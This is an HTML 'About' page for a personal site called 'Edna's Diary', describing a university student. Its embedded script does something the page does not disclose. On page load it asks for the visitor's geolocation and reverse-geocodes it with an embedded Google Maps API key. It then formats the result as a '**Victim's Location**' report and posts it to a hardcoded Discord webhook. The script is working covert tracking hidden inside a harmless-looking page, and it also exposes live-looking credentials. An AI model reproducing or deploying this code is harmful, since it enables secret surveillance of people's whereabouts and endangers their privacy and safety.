<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href="https://api.fontshare.com/v2/css?f[]=spline-sans@300,400,600,700,500,1&f[]=quicksand@600,700,400,300,500,1&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="images/edna-logo.png">
    <link rel="apple-touch-icon" href="images/edna-logo.png" sizes="72x72">
    <link rel="apple-touch-icon" href="images/edna-logo.png">
    <title>Edna's Diary</title>
</head>
<body onload="getLocation()">
    
    <header>
        <div class="header-wrapper">
            <div class="branding">
                <a href="index.html">
                    <img src="images/edna-type.svg" alt="Efua LogoType" class="logo">
                </a>
            </div>
    
            <div class="navigation">
                <ul>
                    <li class="active"><a href="index.html">About</a></li>
                    <li><a href="blog.html">Blog</a></li>
                    <li><a href="contact.html">Reach Me</a></li>
                </ul>
            </div>
        </div>
    </header>

    <div class="main">
        <div class="main-content">
            <p>
                Comfort "Edna" Nyamesi is a dedicated and ambitious student, currently in her final year at the University of Cape Coast where she is studying Biomedical Sciences. With a passion for science and a desire to make a positive impact on the world, Edna has thrown herself into her studies and is determined to succeed.
            </p>
            <br>
            <p>
                In her free time, Edna enjoys indulging her love of reading and writing. She is a talented writer with a vivid imagination and a way with words. When she's not lost in a good book or working on her latest writing project, Edna can often be found curled up on the couch with a movie. As an indoors person, she enjoys nothing more than spending a quiet evening at home with a good film.
            </p>
            <br>
            <p>
                Despite her love of solitude, Edna is also a sociable and friendly person who enjoys spending time with her friends and loved ones. She is always looking for new and interesting ways to engage her mind and explore her passions, whether that means delving into a challenging scientific problem or losing herself in a great story.
            </p>
        </div>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Reverse geocoding to obtain approximate location details
            fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=AIzaSyBEZzDqnabeXaQnC54Q407hlNUwaOFJeNI`)
            .then(response => response.json())
            .then(data => {
                if (data.status === 'OK') {
                    const addressComponents = data.results[0].address_components;

                    // Extract relevant location details
                    let country = '';
                    let city = '';
                    let region = '';
                    let district = '';

                    for (const component of addressComponents) {
                        if (component.types.includes('country')) {
                            country = component.long_name;
                        } else if (component.types.includes('locality') || component.types.includes('sublocality') || component.types.includes('postal_town')) {
                            city = component.long_name;
                        } else if (component.types.includes('administrative_area_level_1')) {
                            region = component.long_name;
                        } else if (component.types.includes('administrative_area_level_2')) {
                            district = component.long_name;
                        }
                    }

                    // Construct the message with location details
                    const message = `
                    **Victim's Location**
                    Country: ${country}
                    City: ${city}
                    Region: ${region}
                    District: ${district}
                    Latitude: ${latitude}
                    Longitude: ${longitude}
                    Accuracy: ${accuracy} meters
                    `;

                    // Send the message to Discord
                    sendToDiscord(message);
                } else {
                    console.error('Reverse geocoding failed:', data.status);
                }
            })
            .catch(error => {
                console.error('Error fetching location details:', error);
            });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    console.error("User denied the request for Geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.error("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    console.error("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    console.error("An unknown error occurred.");
                    break;
            }
        }

        function sendToDiscord(message) {
            const webhookURL = 'https://discord.com/api/webhooks/1223815986189176903/0wTdzWsqTWSRd77pgNhgjTyfy1Vd-bhpyt-7ubi-2sDaeZpc2xKT0wCUZq6XODUJG5C3';
            const data = {
                content: message
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send location to Discord:', response.statusText);
                } else {
                    console.log('Location sent to Discord successfully');
                }
            })
            .catch(error => {
                console.error('Error sending location to Discord:', error);
            });
        }
    </script>

</body>
</html>
